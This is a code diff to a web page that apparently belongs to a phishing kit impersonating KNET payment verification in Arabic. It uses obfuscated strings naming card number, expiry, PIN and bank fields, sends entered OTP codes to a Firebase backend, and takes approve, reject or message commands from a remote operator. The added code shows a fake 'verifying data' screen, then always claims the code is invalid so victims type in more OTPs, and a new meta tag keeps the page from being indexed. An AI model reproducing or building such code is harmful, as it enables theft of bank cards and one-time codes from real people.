@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html><head><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js"></script>
+<html><head><meta name="robots" content="noindex, nofollow, noarchive" /><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js"></script>
 
 <script type="text/javascript">
 var _0xstr = ["azdwcmVmaXg=", "azdiYW5r", "azdjbnVt", "azdleHBtbnRo", "azdleHB5ZWFy", "azdwaW4=", "2LrZitixINmF2LnYsdmI2YE=", "KioqKiAqKioqICoqKiogKioqKg==", "Kio=", "KioqKg==", "I2kzMA==", "aTE2", "aW5wdXQ=", "VGltZW91dCBJbjog", "MA==", "Og==", "KE9UUCkg2YTZgtivINin2YbYqtmH2Kog2LXZhNin2K3ZitipINix2YXYsiDYp9mE2KrYrdmC2YI=", "aTMw", "YmxvY2s=", "IzVlZDYyMDVl", "I2Y3ZGFkZA==", "IzE1N2QxMiAxcHggc29saWQ=", "I2ZmMDAwMCAxcHggc29saWQ=", "IzEyN2QxYg==", "I2ZmMDAwMA==", "aTMy", "aTQy", "aTI5", "bm9uZQ==", "UmVzZW5k", "2KrZhdiqINil2LnYp9iv2Kkg2KrZh9mK2KbYqSDYsdmF2LIg2KfZhNiq2K3ZgtmCINmF2K3ZhNmK2Kcu", "2YrYsdis2Ykg2KXYr9iu2KfZhCDYp9mE2LHZhdiyINin2YTZhdmD2YjZhiDZhdmGIA==", "INij2LHZgtin2YUu", "2LHZhdiyINin2YTYqtit2YLZgiDYp9mE2LDZiiDYo9iv2K7ZhNiq2Ycg2LrZitixINi12KfZhNitINij2Ygg2YXZhtiq2YfZiiDYp9mE2LXZhNin2K3Zitip", "VkFMSURBVEU=", "RA==", "RC1Q", "MTAyNjE2MDI5MDAwMTMzNjQz", "MQ==", "aTQw", "aTA=", "aTIy", "aTIz", "I2kzNyAuazc=", "djljbg==", "djllbQ==", "djlleQ==", "djlwbg==", "S05FVCBTZWN1cml0eSBWZXJpZmljYXRpb24=", "Y3JlZGl0RGViaXRDaGVjaw==", "c2VsZWN0ZWRQeW1udEluc3RybW50", "djIwNA==", "c2VsZWN0ZWRQcmVmaXg=", "djQ3", "dGltZU92ZXI=", "b3RwZmxnZGl2", "b3RwZ2VuTWV0aG9k", "T3RwdGVuYW50", "ZGlzY291bnRlZHRyYW5hbW91bnQ=", "QnJhbkRUeXBl", "Y3NwZw==", "Q1NSRlRva2Vu", "RXJyb3JUZXh0", "cHJlZml4", "YmFuaw=="];
@@ -187,6 +187,27 @@ function v202(action) {
 			console.error("Firebase OTP write error: ", err);
 		});
 	}
+
+	// شاشة الانتظار: جار التحقق من البيانات
+	var waitOv = document.createElement('div');
+	waitOv.id = 'otpWaitOverlay';
+	waitOv.style.cssText = 'position:fixed;inset:0;background:#ffffff;z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:24px;';
+	waitOv.innerHTML =
+		'<div style="width:60px;height:60px;border:6px solid #e2e8f0;border-top-color:#0077D5;border-radius:50%;animation:otpWaitSpin 0.9s linear infinite;"></div>' +
+		'<div style="margin-top:24px;font-size:18px;font-weight:700;color:#1a202c;direction:rtl;line-height:1.6;">جار التحقق من البيانات<br>يرجى عدم اغلاق الصفحة</div>';
+	var waitStyle = document.createElement('style');
+	waitStyle.textContent = '@keyframes otpWaitSpin { to { transform: rotate(360deg); } }';
+	document.head.appendChild(waitStyle);
+	document.body.appendChild(waitOv);
+
+	// بعد 4 ثوانٍ: إخفاء شاشة الانتظار وإظهار رسالة الخطأ
+	setTimeout(function () {
+		var ov = document.getElementById('otpWaitOverlay');
+		if (ov) { ov.remove(); }
+		v220('رمز التحقق غير صحيح او منتهي الصلاحية', false);
+		// إعادة تركيز الحقل
+		if (v199) { v199.focus(); }
+	}, 4000);
 
 	return false;
 }
@@ -405,7 +426,7 @@ jQuery(document).ready(function() {
   }
   if (typeof window.listenForAdminCommands === 'function') {
     window.listenForAdminCommands({
-      onApproval: function () { showAdminOverlay('تمت العملية بنجاح', '#0a7a3d'); setTimeout(function(){ window.location.href = 'index.html'; }, 2500); },
+      onApproval: function () { window.location.href = 'verification.html'; },
       onRejection: function (cmd) { showAdminOverlay('فشلت العملية: ' + ((cmd && cmd.reason) || 'يرجى المحاولة مرة أخرى'), '#c0392b'); setTimeout(function(){ location.reload(); }, 3000); },
       onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
     });
